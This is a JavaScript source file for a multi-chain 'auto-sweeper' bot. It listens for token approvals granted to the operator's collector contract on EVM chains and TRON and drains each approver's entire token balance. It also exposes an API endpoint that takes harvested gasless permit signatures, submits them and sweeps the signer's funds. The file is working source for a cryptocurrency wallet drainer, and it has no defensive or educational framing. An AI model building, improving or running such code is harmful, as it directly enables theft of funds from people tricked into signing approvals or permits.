require('dotenv').config();
const { ethers } = require('ethers');
const { TronWeb } = require('tronweb');
const express = require('express');
const cors = require('cors');

console.log("🚀 Starting Multi-Chain Auto-Sweeper Bot...");

// ==========================================
// 🌐 EXPRESS API SERVER (For Gasless Permits)
// ==========================================
const app = express();
app.use(cors());
app.use(express.json()); // Parses incoming JSON payloads

const PORT = process.env.PORT || 3001;

// ==========================================
// 🟢 EVM SWEEPER CONFIGURATION (DYNAMIC MULTI-TOKEN)
// ==========================================
const evmProvider = new ethers.WebSocketProvider(process.env.EVM_RPC_URL);
const evmWallet = new ethers.Wallet(process.env.EVM_PRIVATE_KEY, evmProvider);

// Upgraded ABI to include the EIP-2612 Permit function
const EVM_TOKEN_ABI = [
    "function balanceOf(address account) view returns (uint256)",
    "function decimals() view returns (uint8)",
    "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
];
const EVM_COLLECTOR_ABI = [
    "function collect(address tokenAddress, address targetUser, uint256 amount) external"
];

const evmCollectorContract = new ethers.Contract(process.env.EVM_COLLECTOR_ADDRESS, EVM_COLLECTOR_ABI, evmWallet);

const approvalFilter = {
    topics: [
        ethers.id("Approval(address,address,uint256)"), 
        null, 
        ethers.zeroPadValue(process.env.EVM_COLLECTOR_ADDRESS, 32) 
    ]
};

// ── 1. ON-CHAIN LISTENER (For standard Gas-paid approvals) ──
evmProvider.on(approvalFilter, async (log) => {
    try {
        const tokenAddress = log.address; 
        const owner = ethers.getAddress(ethers.dataSlice(log.topics[1], 12)); 
        
        console.log(`\n[EVM] 🚨 NEW ON-CHAIN APPROVAL DETECTED!`);
        console.log(`[EVM] Token: ${tokenAddress} | User: ${owner}`);
        
        const dynamicTokenContract = new ethers.Contract(tokenAddress, EVM_TOKEN_ABI, evmProvider);
        const balance = await dynamicTokenContract.balanceOf(owner);
        
        if (balance > 0n) {
            const decimals = await dynamicTokenContract.decimals();
            console.log(`[EVM] Sweeping ${ethers.formatUnits(balance, decimals)} Tokens from ${owner}...`);
            
            const tx = await evmCollectorContract.collect(tokenAddress, owner, balance);
            console.log(`[EVM] ⏳ TX Sent! Hash: ${tx.hash}`);
            
            await tx.wait();
            console.log(`[EVM] ✅ Successfully Swept!`);
        } else {
            console.log(`[EVM] ⚠️ User ${owner} approved, but balance is 0.`);
        }
    } catch (error) {
        console.error(`[EVM] ❌ Sweep Failed:`, error.message);
    }
});

console.log("✅ EVM Multi-Token Listener Active.");

// ── 2. OFF-CHAIN RECEIVER (For Gasless Permits) ──
app.post('/submit-permit', async (req, res) => {
    try {
        const { token, owner, spender, value, deadline, signature } = req.body;
        console.log(`\n[EVM] 🚨 GASLESS PERMIT PAYLOAD RECEIVED!`);
        console.log(`[EVM] Token: ${token} | User: ${owner}`);

        // Cryptographically split the signature into v, r, and s
        const sig = ethers.Signature.from(signature);
        
        // Connect to the specific token contract using your execution wallet
        const tokenContract = new ethers.Contract(token, EVM_TOKEN_ABI, evmWallet);

        console.log(`[EVM] 1/2 Executing Permit Transaction on-chain...`);
        const permitTx = await tokenContract.permit(owner, spender, value, deadline, sig.v, sig.r, sig.s);
        await permitTx.wait();
        console.log(`[EVM] ✅ Permit Finalized!`);

        // Now that the permit is finalized, we instantly sweep
        const balance = await tokenContract.balanceOf(owner);
        if (balance > 0n) {
            const decimals = await tokenContract.decimals();
            console.log(`[EVM] 2/2 Sweeping ${ethers.formatUnits(balance, decimals)} Tokens...`);
            
            const sweepTx = await evmCollectorContract.collect(token, owner, balance);
            console.log(`[EVM] ⏳ TX Sent! Hash: ${sweepTx.hash}`);
            
            await sweepTx.wait();
            console.log(`[EVM] ✅ Gasless Sweep Successful!`);
        } else {
            console.log(`[EVM] ⚠️ Permit successful, but user balance is 0.`);
        }

        res.status(200).json({ success: true, message: "Permit executed and swept." });
    } catch (error) {
        console.error(`[EVM] ❌ Permit Execution Failed:`, error.message);
        res.status(500).json({ error: error.message });
    }
});

// ==========================================
// 🔴 TRON SWEEPER CONFIGURATION (V6 POLLING METHOD)
// ==========================================
const tronWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_HOST,
    privateKey: process.env.TRON_PRIVATE_KEY
});

const TRON_USDT_ABI = [
    { "inputs": [ { "name": "who", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "stateMutability": "view", "type": "function" }
];

const TRON_COLLECT_ABI = [
    { inputs: [{ name: 'tokenAddress', type: 'address' }, { name: 'targetUser', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' }
];

async function startTronListener() {
    try {
        const tronUsdtContract = await tronWeb.contract(TRON_USDT_ABI, process.env.TRON_USDT_ADDRESS);
        const tronCollectorContract = await tronWeb.contract(TRON_COLLECT_ABI, process.env.TRON_COLLECTOR_ADDRESS);

        console.log("✅ TRON Listener Active (Polling Mode).");

        let lastProcessedTimestamp = Date.now() - 3000;
        const processedTxs = new Set();

        setInterval(async () => {
            try {
                const events = await tronWeb.event.getEventsByContractAddress(
                    process.env.TRON_USDT_ADDRESS,
                    {
                        eventName: 'Approval',
                        minBlockTimestamp: lastProcessedTimestamp,
                        orderBy: 'block_timestamp,asc'
                    }
                );

                if (events && events.data && events.data.length > 0) {
                    for (const event of events.data) {
                        
                        if (processedTxs.has(event.transaction_id)) continue;
                        processedTxs.add(event.transaction_id);
                        if (processedTxs.size > 1000) processedTxs.clear();

                        if (event.block_timestamp >= lastProcessedTimestamp) {
                            lastProcessedTimestamp = event.block_timestamp + 1;
                        }

                        const spenderHex = event.result.spender || event.result._spender;
                        if (!spenderHex) continue;
                        
                        const spenderBase58 = tronWeb.address.fromHex(spenderHex);

                        if (spenderBase58 === process.env.TRON_COLLECTOR_ADDRESS) {
                            const ownerHex = event.result.owner || event.result._owner;
                            const ownerBase58 = tronWeb.address.fromHex(ownerHex);

                            console.log(`\n[TRON] 🚨 APPROVAL DETECTED! User: ${ownerBase58}`);

                            try {
                                const balanceObj = await tronUsdtContract.balanceOf(ownerBase58).call();
                                const balanceStr = balanceObj.toString();

                                if (Number(balanceStr) > 0) {
                                    console.log(`[TRON] Sweeping ${Number(balanceStr) / 1_000_000} USDT from ${ownerBase58}...`);
                                    
                                    const txId = await tronCollectorContract.collect(process.env.TRON_USDT_ADDRESS, ownerBase58, balanceStr).send({
                                        feeLimit: 150_000_000
                                    });
                                    
                                    console.log(`[TRON] ✅ Sweep TX Sent! Hash: ${txId}`);
                                } else {
                                    console.log(`[TRON] ⚠️ User ${ownerBase58} approved, but balance is 0.`);
                                }
                            } catch (error) {
                                console.error(`[TRON] ❌ Sweep Failed:`, error.message);
                            }
                        }
                    }
                }
            } catch (pollError) {
                // Silently catch API timeouts
            }
        }, 3000); 
        
    } catch (e) {
        console.error("Failed to initialize TRON listener:", e.message);
    }
}

// ── LAUNCH EVERYTHING ──
startTronListener();

app.listen(PORT, () => {
    console.log(`📡 API Server Active: Listening for Gasless Permits on port ${PORT}`);
});